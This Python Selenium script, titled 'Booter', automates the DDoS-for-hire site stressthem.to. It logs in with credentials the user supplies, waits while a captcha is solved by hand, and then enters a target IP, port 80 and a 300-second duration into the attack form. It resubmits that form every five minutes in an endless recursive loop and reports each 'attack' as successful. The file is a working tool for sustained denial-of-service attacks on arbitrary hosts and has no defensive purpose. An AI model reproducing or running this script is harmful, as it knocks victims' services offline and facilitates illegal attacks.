from selenium import webdriver 
from selenium.webdriver.support.ui import Select
from os import system
from pyfiglet import Figlet
import time
import pyfiglet
import os, sys

chrome_options = webdriver.ChromeOptions()
#chrome_options.add_argument("--headless")
chrome_options.add_argument("--log-level=3")
driver = webdriver.Chrome(r"chromedriver.exe", options=chrome_options)
driver.set_window_size(1024, 1080)

def clear():
    
    os.system("cls" if os.name == "nt" else "echo -e \\\\033c")
    os.system("mode con: cols=105 lines=30")

clear()

i = 0

pyfiglet.print_figlet("Booter")

print("\033[1;32;40m Stressthem credentials!")
ip = input("\033[1;37;40m[>] \033[1;32;40mEnter the ip: \033[1;37;40m")
user = input("\033[1;37;40m[>] \033[1;32;40mEnter your username: \033[1;37;40m")
passw = input("\033[1;37;40m[>] \033[1;32;40mEnter your password: \033[1;37;40m")
print("\033[1;32;40m Starting... \n")

def loop1():
    global i
    try:
        driver.get("https://www.stressthem.to/login")
        driver.find_element_by_xpath("/html/body/div[2]/main/div/form/div[1]/input").send_keys(user)
        driver.find_element_by_xpath("/html/body/div[2]/main/div/form/div[2]/input").send_keys(passw)
        time.sleep(1)
        driver.find_element_by_xpath("/html/body/div[2]/main/div/form/div[4]/button").click()
        print("\033[1;37;40m[>] \033[1;32;40mSolve captcha! You have 2 minutes.")
        time.sleep(130)
        driver.get("https://www.stressthem.to/booter")
        time.sleep(2)
        driver.find_element_by_xpath("/html/body/div[2]/div[2]/div[3]/div[2]/div[2]/form/div[1]/div[2]/div[2]/select").click()
        time.sleep(1)
        driver.find_element_by_xpath("/html/body/div[2]/div[2]/div[3]/div[2]/div[2]/form/div[1]/div[2]/div[2]/select/option[2]").click()
        time.sleep(1)
        driver.find_element_by_xpath("/html/body/div[2]/div[2]/div[3]/div[2]/div[2]/form/div[2]/input").send_keys(ip)
        driver.find_element_by_xpath("/html/body/div[2]/div[2]/div[3]/div[2]/div[2]/form/div[2]/div[1]/input[1]").send_keys("80")
        driver.find_element_by_xpath("/html/body/div[2]/div[2]/div[3]/div[2]/div[2]/form/div[2]/div[1]/input[2]").send_keys("300")
        time.sleep(1)
        driver.find_element_by_xpath("/html/body/div[2]/div[2]/div[3]/div[2]/div[2]/form/div[2]/button").click()
        i += 1
        total = i * 5
        print("\033[1;37;40m[>] \033[1;32;40mTarget ip attacked successfully!")
        print("\033[1;37;40m[>]", total, "\033[1;32;40mMinutes.")
        time.sleep(300)
        loop2()
    except:
        print("\033[1;31;40m Error!")
        loop2()

def loop2():
    global i
    try:
        driver.refresh()
        driver.find_element_by_xpath("/html/body/div[2]/div[2]/div[3]/div[2]/div[2]/form/div[1]/div[2]/div[2]/select").click()
        time.sleep(1)
        driver.find_element_by_xpath("/html/body/div[2]/div[2]/div[3]/div[2]/div[2]/form/div[1]/div[2]/div[2]/select/option[2]").click()
        time.sleep(1)
        driver.find_element_by_xpath("/html/body/div[2]/div[2]/div[3]/div[2]/div[2]/form/div[2]/input").send_keys(ip)
        driver.find_element_by_xpath("/html/body/div[2]/div[2]/div[3]/div[2]/div[2]/form/div[2]/div[1]/input[1]").send_keys("80")
        driver.find_element_by_xpath("/html/body/div[2]/div[2]/div[3]/div[2]/div[2]/form/div[2]/div[1]/input[2]").send_keys("300")
        time.sleep(1)
        driver.find_element_by_xpath("/html/body/div[2]/div[2]/div[3]/div[2]/div[2]/form/div[2]/button").click()
        i += 1
        total = i * 5
        print("\033[1;37;40m[>] \033[1;32;40mTarget ip attacked successfully!")
        print("\033[1;37;40m[>]", total, "\033[1;32;40mMinutes.")
        time.sleep(300)
        loop2()
    except:
        print("\033[1;31;40m Error!")
        driver.refresh()
        loop2()

loop1()


        

